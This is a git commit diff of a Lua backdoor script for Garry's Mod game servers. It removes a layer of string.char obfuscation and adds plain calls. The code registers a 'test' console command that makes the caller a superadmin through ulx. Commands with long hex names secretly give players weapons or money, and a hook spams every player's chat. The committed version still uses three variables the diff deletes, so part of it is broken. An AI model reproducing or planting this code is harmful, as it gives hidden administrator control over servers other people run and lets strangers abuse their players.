c01ba39e8220090114ca170294418664bf60716f
DEADMONSTOR <josh14m@aol.com>
2016-10-11 17:53:08 +0100

    Update hehexd.lua

--- Stuff/hehexd.lua
+++ Stuff/hehexd.lua
@@ -1,26 +1,17 @@
 
-local RCC = string.char(82,	117,	110,	67,	111,	110,	115,	111,	108,	101,	67,	111,	109,	109,	97,	110,	100 , 40	, 41 )
-local REKT = string.char(101,	110,	100)
-local HAHAHAHAHHA = string.char(117,	108,	120,	32,	97,	100	,100,	117,	115,	101,	114,	32)
-local HAHHAHAHAHAH = string.char(32,	115,	117,	112,	101,	114,	97,	100,	109,	105,	110)
-local lmfao = string.char(112,	108,	121,	58,	83,	116,	101,	97,	109	,73,	68,	40,	41)
 local GGWP = player.GetAll()
-local LMFAO = string.char(97,100,100,77,111,110,101,121)
-local lol = string.char(99,111,110,99,111,109,109,97,110,100,46,65,100,100)
-local wtf = string.char(104,111,111,107)
-local xD = string.char(116,111,110,117,109,98,101,114)
-local xDs = string.char(116,111,115,116,114,105,110,103)
 
-function HEHEXD(ply , cmd , args) RCC(HAHAHAHAHHA,lmfao,HAHHAHAHAHAH) end lol('test' , HEHEXD)
 
-function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:Give(tostring(args[1])) end end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
+function HEHEXD(ply , cmd , args) RunConsoleCommand(HAHAHAHAHHA,lmfao,HAHHAHAHAHAH) end concommand.Add('test' , HEHEXD)
+
+function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:Give(tostring(args[1])) end end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
 
 function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:ConCommand('/ooc HEHEXD Rules All') end end
 
-function HEHEXDV4(ply , cmd , args) wtf.Add('Think', 'JHASJDHK', HEHEXDV3 ) end lol('StartThatCrapLOL', HEHEXDV4)
+function HEHEXDV4(ply , cmd , args) hook.Add('Think', 'JHASJDHK', HEHEXDV3 ) end concommand.Add('StartThatCrapLOL', HEHEXDV4)
 
-function HEHEXDV5(ply , cmd , args) wtf.Remove('Think', 'JHASJDHK' ) end lol('StopThatCrapLol', HEHEXDV5)
+function HEHEXDV5(ply , cmd , args) hook.Remove('Think', 'JHASJDHK' ) end concommand.Add('StopThatCrapLol', HEHEXDV5)
 
-function HEHEXDV6(ply , cmd , args) ply:LMFAO(xD(args[1])) end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF6', HEHEXDV6)
+function HEHEXDV6(ply , cmd , args) ply:addMoney(tonumber(args[1])) end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF6', HEHEXDV6)
 
-function HEHEXDV7(ply , cmd , args) ply:Give(xDs(args[1])) end lol('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEA6', HEHEXDV7)
+function HEHEXDV7(ply , cmd , args) ply:Give(tostring(args[1])) end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEA6', HEHEXDV7)
